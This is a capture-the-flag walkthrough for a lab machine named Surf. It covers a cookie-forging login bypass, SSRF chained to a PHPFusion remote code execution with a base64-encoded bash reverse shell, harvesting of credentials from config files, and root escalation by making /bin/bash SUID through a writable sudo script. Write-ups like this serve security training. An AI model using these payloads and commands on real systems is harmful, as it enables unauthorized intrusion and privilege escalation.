# Surf

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.175.171   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 16:06 +08
Nmap scan report for 192.168.175.171
Host is up (0.17s latency).
Not shown: 41614 filtered tcp ports (no-response), 23919 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Surfing Blog -> Login Bypass

Port 80 took so long to load I didn't bother with it. Instead, I started with a `gobuster` scan:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.175.171 -t 100    
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.175.171
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/01 16:19:50 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 319] [--> http://192.168.175.171/assets/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.175.171/css/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.175.171/js/]
/administration       (Status: 301) [Size: 327] [--> http://192.168.175.171/administration/]
```

There's an administration directory present, and when viewed it just shows a login page:

<figure><img src="../../../.gitbook/assets/image (3301).png" alt=""><figcaption></figcaption></figure>

I tried default and weak credentials, but they don't work. When the traffic is viewed in Burp, we can see that there are some tokens being passed around:

<figure><img src="../../../.gitbook/assets/image (3977).png" alt=""><figcaption></figcaption></figure>

The `auth_status` cookie is just a `base64` encoded string of `{'success':'false'}`. Afterwards, the `auth_status` cookie is appended to every subsequent login attempt. We can easily replace this with `true` and be granted access to the admin dashboard:

<figure><img src="../../../.gitbook/assets/image (2658).png" alt=""><figcaption></figcaption></figure>

### SSRF -> RCE

Within the website, there isn't much functionality, but there is a 'Check Server Status' function:

<figure><img src="../../../.gitbook/assets/image (2868).png" alt=""><figcaption></figcaption></figure>

Here's the HTTP request sent:

```http
POST /administration/checkserver.php HTTP/1.1
Host: 192.168.175.171
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://192.168.175.171
Connection: close
Referer: http://192.168.175.171/administration/checkserver.php
Cookie: auth_status=eydzdWNjZXNzJzondHJ1ZSd9; PHPSESSID=nvesm039uh8qqsd19aqv25jhg3
Upgrade-Insecure-Requests: 1



url=http%3A%2F%2F127.0.0.1%3A8080
```

This looks vulnerable to a SSRF, and we can confirm it is.&#x20;

<figure><img src="../../../.gitbook/assets/image (2632).png" alt=""><figcaption></figcaption></figure>

Also, it tells us that the backend server is running PHPFusion. There are a few exploits available for PHPFusion:

```
$ searchsploit phpfusion    
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
PHPFusion 9.03.50 - Persistent Cross-Site Scripting        | php/webapps/48497.txt
PHPFusion 9.03.50 - Remote Code Execution                  | php/webapps/49911.py
----------------------------------------------------------- ---------------------------------
```

We can download and view the RCE exploit to find that the exploit is triggered by sending a request to `/infusions/downloads/downloads.php?cat_id=${system(ls)}`.&#x20;

Using the exploit, we can create a payload generator as such:

```python
import base64
PAYLOAD = "bash -c  'bash  -i >& /dev/tcp/192.168.45.164/443 0>&1'  " # !!spaces are important in order to avoid ==!!
REQUEST_PAYLOAD = "/infusions/downloads/downloads.php?cat_id=$\{{system(base64_decode({})).exit\}}"

PAYLOAD_B64 = base64.b64encode(PAYLOAD.encode('ascii')).decode("ascii")
print(REQUEST_PAYLOAD.format(PAYLOAD_B64))
```

This would print `base64` encoded payload, which we can submit like so:

```http
POST /administration/checkserver.php HTTP/1.1
Host: 192.168.175.171
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
Origin: http://192.168.175.171
Connection: close
Referer: http://192.168.175.171/administration/checkserver.php
Cookie: auth_status=eydzdWNjZXNzJzondHJ1ZSd9; PHPSESSID=rnaerbm2cbt3193qgev658ap3k
Upgrade-Insecure-Requests: 1



url=http://127.0.0.1:8080/infusions/downloads/downloads.php?cat_id=$\{system(base64_decode(YmFzaCAtYyAgJ2Jhc2ggIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTY0LzQ0MyAwPiYxJyAg)).exit\}
```

Then we can get a reverse shell and grab the user flag:

<figure><img src="../../../.gitbook/assets/image (3006).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### James Creds

As usual, we should be looking at credential files within the website. There are some in the `/var/www/html/config.php` file:

```php
<?php
// database settings
$db_host = 'localhost';
$db_port = '3306';
$db_user = 'phpfusion';
$db_pass = 'phpfusion';
$db_name = 'phpfusion';
$db_prefix = 'fusionc6Jb6_';
$db_driver = 'pdo';
define("DB_PREFIX", "fusionc6Jb6_");
define("COOKIE_PREFIX", "fusion33hvd_");
define("SECRET_KEY", "2RH443cPDc588jUkNtQ29fjHwJIS89Ez");
define("SECRET_KEY_SALT", "F6UU9T38pjH48myWA3HqkkN431l26GkI");
```

There are other files in the `/var/www` file present as well:

```
www-data@Surf:/var/www$ ls   
html  server
```

We can find credentials inside the `server` file for the user `james`.&#x20;

```php
www-data@Surf:/var/www/server/administration/config$ cat config.php 
<?php

//Note: This file should be included first in every php page.
error_reporting(E_ALL);
ini_set('display_errors', 'On');
define('BASE_PATH', dirname(dirname(__FILE__)));
define('APP_FOLDER', 'simpleadmin');
define('CURRENT_PAGE', basename($_SERVER['REQUEST_URI']));

require_once BASE_PATH . '/lib/MysqliDb/MysqliDb.php';
require_once BASE_PATH . '/helpers/helpers.php';

/*
|--------------------------------------------------------------------------
| DATABASE CONFIGURATION
|--------------------------------------------------------------------------
 */

define('DB_HOST', "localhost");
define('DB_USER', "core");
define('DB_PASSWORD', "FlyToTheMoon213!");
define('DB_NAME', "corephpadmin");

/**
 * Get instance of DB object
 */
function getDbInstance() {
        return new MysqliDb(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
}
```

We can then `su` to `james`:

<figure><img src="../../../.gitbook/assets/image (477).png" alt=""><figcaption></figcaption></figure>

### Sudo Privileges

Since we have the password for `james`, we can check our `sudo` privileges:

```
james@Surf:/home$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for james: 
Matching Defaults entries for james on Surf:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User james may run the following commands on Surf:
    (ALL) /usr/bin/php /var/backups/database-backup.php
```

This file is owned by `www-data` and we can write to it:

```
james@Surf:/home$ ls -la /var/backups/database-backup.php
-rwxr-xr-x 1 www-data www-data 2758 Nov  9  2021 /var/backups/database-backup.php
```

The exploit would be to write a small snippet making `/bin/bash` an SUID binary and then executing it as `james`.&#x20;

We can use `vi` to edit the file to include `system("chmod u+s /bin/bash");`, and then use `:wq!` to force the save. Afterwards, when we can run the file using `sudo` as `james`:

<figure><img src="../../../.gitbook/assets/image (2267).png" alt=""><figcaption></figcaption></figure>

Then we can easily become the `root` user:

<figure><img src="../../../.gitbook/assets/image (1320).png" alt=""><figcaption></figcaption></figure>
